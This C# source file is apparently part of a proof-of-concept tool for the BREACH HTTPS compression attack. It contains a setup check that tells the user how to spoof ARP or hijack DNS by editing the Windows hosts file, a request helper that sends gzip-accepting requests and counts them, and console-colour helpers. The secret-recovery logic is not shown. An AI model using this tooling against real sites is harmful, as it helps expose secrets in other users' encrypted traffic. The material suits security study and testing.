using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace BREACHBasic
{
    partial class Program
    {
        public static bool CheckRequirements()
        {
            Uri uri = new Uri(TargetURL);
            IPAddress[] addresslist = Dns.GetHostAddresses(uri.Host);

            foreach (IPAddress theaddress in addresslist)
            {
                if (theaddress.ToString().Equals("127.0.0.1"))
                {
                    continue;
                }
                else
                {
                    WriteConsoleWarning("## WARNING ## " + uri.Host + " resolves to " + theaddress.ToString()+ "\n");
                    WriteConsoleWarning("ARP spoofing or manual DNS Hijack is required for BREACH PoC:");
                    WriteConsoleInfo("1. open: cmd.exe (with administrator privileges)");
                    WriteConsoleInfo("2. type: \n  (echo. && echo 127.0.0.1 malbot.net) >> %windir%\\system32\\drivers\\etc\\hosts\n");
                    WriteConsoleInfo("3. rerun BREACH PoC");
                    Console.ReadLine();
                    return false;
                }
            }

            if (Process.GetProcessesByName("SSLProxy").Length == 0
                && Process.GetProcessesByName("SSLProxy.vshost").Length == 0)
            {
                WriteConsoleWarning("## WARNING ## SSLProxy.exe not detected");
                WriteConsoleInfo("> Please run SSLProxy first");
                Console.ReadLine();
                return false;
            }

            WriteConsoleInfo("-- BREACH BASIC PoC (browserless, no advanced recovery) STARTED --\n\n");
            return true;
        }


        public static string HttpGet(string uri)
        {
            WebRequest webRequest;

            try
            {
                Uri myUri = new Uri(uri, true);
                webRequest = WebRequest.Create(myUri);
            }
            catch (NotSupportedException)
            {
                Console.WriteLine("## WebSockets Fail :: unsupported URI " + uri);
                return null;
            }

            webRequest.Timeout = 15 * 1000;
            webRequest.Headers["Cache-Control"] = "no-cache";
            webRequest.Headers["Accept-Encoding"] = "gzip,deflate";
            webRequest.Headers["Pragma"] = "no-cache";

            ((HttpWebRequest)webRequest).Accept = "*/*";
            ((HttpWebRequest)webRequest).UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (BREACH 1.0, like Gecko) Chrome/22.0.1229.94 Safari/537.4";
            ((HttpWebRequest)webRequest).KeepAlive = true;

            try
            {
                using (WebResponse response = webRequest.GetResponse())
                {
                    using (Stream stream = response.GetResponseStream())
                    {
                        using (StreamReader sr = new StreamReader(stream))
                        {
                            NumberOfRequests++;

                            // We don't actually need to see the result, so just return null
                            sr.ReadToEnd();
                            sr.Close();
                            return null;
                        }
                    }
                }
            }
            catch (WebException e)
            {
                Console.WriteLine("## WebSockets Fail :: " + e);
            }
            catch (Exception e)
            {
                Console.WriteLine("## WebSockets Unknown Fail :: " + e);
            }

            return null;
        }


        public static void WriteConsoleInfo(string message)
        {
            ConsoleColor originalColor = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(message);
            Console.ForegroundColor = originalColor;
        }

        public static void WriteConsoleSuccess(string message)
        {
            ConsoleColor originalColor = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(message);
            Console.ForegroundColor = originalColor;
        }

        public static void WriteConsoleError(string message)
        {
            ConsoleColor originalColor = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(message);
            Console.ForegroundColor = originalColor;
        }

        public static void WriteConsoleWarning(string message)
        {
            ConsoleColor originalColor = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(message);
            Console.ForegroundColor = originalColor;
        }

    }
}
